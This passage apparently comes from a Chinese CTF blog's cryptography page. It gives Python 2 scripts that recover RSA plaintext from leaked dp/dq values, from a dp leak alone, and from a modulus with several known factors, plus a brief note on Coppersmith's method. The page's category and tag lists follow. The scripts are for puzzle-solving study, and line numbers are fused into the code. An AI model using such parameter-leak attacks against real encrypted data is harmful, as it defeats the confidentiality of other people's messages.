已知dp,dq求解m123456789101112131415import gmpy2 from Crypto.Util.number import long_to_bytes c = xxx p = xxx q = xxx dp = xxx dq = xxx InvQ=gmpy2.invert(q,p) mp=pow(c,dp,p) mq=pow(c,dq,q) m=(((mp-mq)*InvQ)%p)*q+mq print long_to_bytes(m) CopperSmith定理攻击前提： 若e较小，并且已知m的高位，则可通过此方法求出完整的m。 m=0x65c46754a7776c8b88867e000000000000000000 前面的部分就是高位，后面的0就是低位，0只是占位的作用并不是真正m的值。 已知e,n,dp,c求m1234567891011121314151617import gmpy2import libnumfrom Crypto.Util.number import long_to_bytese= 65537n = 9637571466652899741848142654451413405801976834328667418509217149503238513830870985353918314633160277580591819016181785300521866901536670666234046521697590230079161867282389124998093526637796571100147052430445089605759722456767679930869250538932528092292071024877213105462554819256136145385237821098127348787416199401770954567019811050508888349297579329222552491826770225583983899834347983888473219771888063393354348613119521862989609112706536794212028369088219375364362615622092005578099889045473175051574207130932430162265994221914833343534531743589037146933738549770365029230545884239551015472122598634133661853901c = 5971372776574706905158546698157178098706187597204981662036310534369575915776950962893790809274833462545672702278129839887482283641996814437707885716134279091994238891294614019371247451378504745748882207694219990495603397913371579808848136183106703158532870472345648247817132700604598385677497138485776569096958910782582696229046024695529762572289705021673895852985396416704278321332667281973074372362761992335826576550161390158761314769544548809326036026461123102509831887999493584436939086255411387879202594399181211724444617225689922628790388129032022982596393215038044861544602046137258904612792518629229736324827dp = 81339405704902517676022188908547543689627829453799865550091494842725439570571310071337729038516525539158092247771184675844795891671744082925462138427070614848951224652874430072917346702280925974595608822751382808802457160317381440319175601623719969138918927272712366710634393379149593082774688540571485214097for i in range(1,65538): if (dp*e-1)%i == 0: if n%(((dp*e-1)/i)+1)==0: p=((dp*e-1)/i)+1 q=n/(((dp*e-1)/i)+1) phi = (p-1)*(q-1) d = gmpy2.invert(e,phi)%phi m = pow(c,d,n) print long_to_bytes(m) N分解出多个不同的因子前提： 题目给出的模数N可直接分解，但是分解之后得到了多个不同的因子。 12345678910111213import gmpy2from Crypto.Util.number import long_to_bytesn= 544187306850902797629107353619267427694837163600853983242783e= 39293c= 439254895818320413408827022398053685867343267971712332011972p1 = 67724172605733871p2 = 11571390939636959887p3 = 694415063702720454699679phi = (p1-1)*(p2-1)*(p3-1) d = gmpy2.invert(e, phi) m = pow(c, d, n) print long_to_bytes(m)","categories":[{"name":"CTF-密码","slug":"CTF-密码","permalink":"http://s1eady.top/categories/CTF-%E5%AF%86%E7%A0%81/"}],"tags":[{"name":"CTF-密码","slug":"CTF-密码","permalink":"http://s1eady.top/tags/CTF-%E5%AF%86%E7%A0%81/"}]}],"categories":[{"name":"CTF-流量分析","slug":"CTF-流量分析","permalink":"http://s1eady.top/categories/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"内网安全","slug":"内网安全","permalink":"http://s1eady.top/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"},{"name":"渗透测试","slug":"渗透测试","permalink":"http://s1eady.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"Python学习","slug":"Python学习","permalink":"http://s1eady.top/categories/Python%E5%AD%A6%E4%B9%A0/"},{"name":"OWASP-TOP10","slug":"OWASP-TOP10","permalink":"http://s1eady.top/categories/OWASP-TOP10/"},{"name":"组件安全","slug":"组件安全","permalink":"http://s1eady.top/categories/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/"},{"name":"PHP开发学习","slug":"PHP开发学习","permalink":"http://s1eady.top/categories/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"},{"name":"By-pass","slug":"By-pass","permalink":"http://s1eady.top/categories/By-pass/"},{"name":"安全工具学习","slug":"安全工具学习","permalink":"http://s1eady.top/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/"},{"name":"CTF-杂项","slug":"CTF-杂项","permalink":"http://s1eady.top/categories/CTF-%E6%9D%82%E9%A1%B9/"},{"name":"CTF-密码","slug":"CTF-密码","permalink":"http://s1eady.top/categories/CTF-%E5%AF%86%E7%A0%81/"},{"name":"CTF-python","slug":"CTF-python","permalink":"http://s1eady.top/categories/CTF-python/"},{"name":"前端安全","slug":"前端安全","permalink":"http://s1eady.top/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"},{"name":"Linux","slug":"Linux","permalink":"http://s1eady.top/categories/Linux/"}],"tags":[{"name":"CTF-流量分析","slug":"CTF-流量分析","permalink":"http://s1eady.top/tags/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"内网","slug":"内网","permalink":"http://s1eady.top/tags/%E5%86%85%E7%BD%91/"},{"name":"渗透测试","slug":"渗透测试","permalink":"http://s1eady.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"Python","slug":"Python","permalink":"http://s1eady.top/tags/Python/"},{"name":"OWSP-TOP10","slug":"OWSP-TOP10","permalink":"http://s1eady.top/tags/OWSP-TOP10/"},{"name":"组件安全","slug":"组件安全","permalink":"http://s1eady.top/tags/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/"},{"name":"PHP开发学习","slug":"PHP开发学习","permalink":"http://s1eady.top/tags/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"},{"name":"By-pass","slug":"By-pass","permalink":"http://s1eady.top/tags/By-pass/"},{"name":"安全工具学习","slug":"安全工具学习","permalink":"http://s1eady.top/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/"},{"name":"CTF-杂项","slug":"CTF-杂项","permalink":"http://s1eady.top/tags/CTF-%E6%9D%82%E9%A1%B9/"},{"name":"CTF-密码","slug":"CTF-密码","permalink":"http://s1eady.top/tags/CTF-%E5%AF%86%E7%A0%81/"},{"name":"CTF-python","slug":"CTF-python","permalink":"http://s1eady.top/tags/CTF-python/"},{"name":"Cookie与Session","slug":"Cookie与Session","permalink":"http://s1eady.top/tags/Cookie%E4%B8%8ESession/"},{"name":"Linux","slug":"Linux","permalink":"http://s1eady.top/tags/Linux/"}]}